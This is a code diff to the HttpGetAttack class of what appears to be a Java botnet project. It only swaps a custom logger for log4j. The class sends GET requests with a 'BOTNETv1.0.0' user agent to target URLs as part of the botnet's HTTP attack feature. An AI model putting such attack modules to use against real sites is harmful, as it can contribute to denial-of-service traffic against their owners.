@@ -27,7 +27,8 @@
 package com.acmutv.botnet.attack;
 
 import com.acmutv.botnet.target.HttpTarget;
-import com.acmutv.botnet.service.Logger;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
 
 import java.io.IOException;
 import java.net.*;
@@ -42,6 +43,8 @@ import java.util.Random;
  */
 public class HttpGetAttack extends HttpAttack {
 
+  private static final Logger LOGGER = LogManager.getLogger(HttpAttack.class);
+
   public HttpGetAttack(HttpTarget target, Random rndgen) {
     super(target, rndgen);
   }
@@ -51,12 +54,13 @@ public class HttpGetAttack extends HttpAttack {
   }
 
   public void makeAttack(final URL url) throws IOException {
+    LOGGER.traceEntry("url={}", url);
     HttpURLConnection http = (HttpURLConnection) url.openConnection();
     http.setRequestMethod("GET");
     http.setRequestProperty("User-Agent", "BOTNETv1.0.0");
     int response = http.getResponseCode();
 
-    Logger.info(String.format("HTTP-ATTACK :: GET %s :: %s", url, response));
+    LOGGER.info("HTTP-ATTACK :: GET {} :: {}", url, response);
   }
 
 }
